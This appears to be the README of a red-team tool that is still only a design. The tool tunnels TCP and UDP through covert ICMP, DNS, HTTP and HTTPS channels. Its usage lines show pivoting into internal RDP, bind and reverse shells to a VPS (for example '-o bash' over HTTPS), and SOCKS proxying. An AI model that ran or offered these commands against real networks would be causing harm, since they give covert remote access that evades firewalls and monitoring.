# C0verter
**Currently just a design.**

Integrated tunneling & proxy tool with covert channel support, transmitting TCP/UDP over IPv6,ICMP,DNS,HTTP,HTTPS.

## Usage
C0verter automatically determines whether to work as server or client by checking the `--in` argument. 
Root previlige is needed for server to listen on some specific ports.

Args:
- in: address inside the tunnel, local or remote address.
- out: target port outside the tunnel, will use command-line IO if not defined, will work as proxy if `--proxy` is set.
- covert: which type of covert channel to use, none as default.
- proxy: use socks5(?) proxy, set to false by default.

Usage:
```shellscript
C0 --in TunnelAddr [--out TargetAddr] [--covert http/icmp/dns] [--proxy]
C0 -i TunnelAddr [-o TargetAddr] [-c http/icmp/dns] [-p]
C0 -i TunnelAddr [-o TargetAddr] -c https -crt serveer.crt -key server.key [-p/--proxy]
```

Examples:
```shellscript
C0 -i localhost:8080 -o web:80 
C0 -i vps:5000 -o internal:3389 --covert https --crt server.crt --key server.key
C0 -i :5000 -o cmd.exe
```

## Scenarios

### Vps-http->Web-rdp->Internal
HTTP covert channel
```shellscript
VPS:C0 -i web:5000 -o :3388 -c http
Web:C0 -i :5000 -o internal:3389 -c http
```
- HTTP隧道可以任意方向
- 需要指定Tunnel端口

### Vps<-icmp-Web-rdp->Internal
ICMP covert channel
```shellscript
VPS:C0 -i web: -o :3388 -c icmp
Web:C0 -i vps: -o internal:3389 -c icmp
```
- ICMP隧道一般需要由Web主动连接VPS（考虑NAT和防火墙）
- 无需指定Tunnel端口（？）
- 需要指定Web公网IP

### Transfer Port
```shellscript
Web:C0 -i :8080 -o :3389
```
- 本地端口转发
- 8080进入的TCP/UDP流量被转发至3389

### Shell
Raw channel
```shellscript
VPS:C0 -i web:8080  
Web:C0 -i :8080 -o bash
```
- VPS上Target留空，表示使用命令行IO
- Web上Target使用程序名，使用标准IO

### Reverse Shell
HTTPS covert channel
```shellscript
VPS:C0 -i :3690 -c https --crt server.crt --key server.key
Web:C0 -i vps:3690 -o bash -c https
```
- VPS上Target留空，表示使用命令行IO
- Web上Target使用程序名，使用命令行IO
- HTTPS隧道需要通过参数提供证书文件，不可硬编码

### Proxy
HTTP covert channel, work as proxy
```shellscript
VPS:C0 -i web:3690 -o :3691 -c http --proxy 
Web:C0 -i :3691 -c http --proxy
```
- VPS上使用3691作为socks5代理
- Web上Target留空，并作为proxy工作

### Reverse Proxy
DNS covert channel, work as proxy
```shellscript
VPS:C0 -i : -o :3691 -c dns --proxy
Web:C0 -i vps: -c dns --proxy
```
- VPS上使用3691作为socks5代理
- Web上Target留空，作为proxy工作
- DNS隧道端口默认53，无需指定


## Disclaimer

**该工具仅用于学习交流，恶意使用该工具造成的损失与开发者无关。**

**C0verter is for educational purposes only. Developers are not responsible for losses and damage caused by misuse of this tool.**
